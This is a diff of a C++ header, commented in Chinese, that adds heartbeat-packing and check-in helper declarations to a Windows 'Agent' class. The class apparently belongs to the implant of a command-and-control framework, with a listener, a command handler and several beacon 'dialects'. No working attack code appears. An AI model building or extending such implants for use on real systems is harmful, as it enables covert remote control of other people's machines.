@@ -9,6 +9,7 @@
 #include "Commander.h"
 
 class Commander;
+class Packer;
 
 // Agent 是 Windows 端的核心对象，统一持有配置、主机信息、通信、任务和命令处理器。
 class Agent
@@ -40,4 +41,20 @@ public:
 	static void* operator new(size_t sz);
 	// 使用自定义内存释放 Agent。
 	static void operator delete(void* p) noexcept;
+
+private:
+	// 生成心跳里的主机状态位图。
+	BYTE BuildBeatFlags();
+	// 写入 listener wrapper 兼容的外层字段：agent_type / agent_id。
+	VOID PackBeatOuterHeader(Packer* packer);
+	// 写入 legacy/v2 共用的固定主机字段。
+	VOID PackBeatCoreFields(Packer* packer, BYTE flag);
+	// 写入 legacy 心跳 dialect。
+	VOID PackBeatLegacy(Packer* packer, BYTE flag);
+	// 写入自研 v2 心跳 dialect。
+	VOID PackBeatV2(Packer* packer, BYTE flag);
+	// 写入只携带进程名的 schema5 心跳 dialect。
+	VOID PackBeatV5(Packer* packer, BYTE flag);
+	// 释放 AgentInfo 里只在首次 check-in 使用的字符串字段。
+	VOID ReleaseBeatIdentityFields();
 };
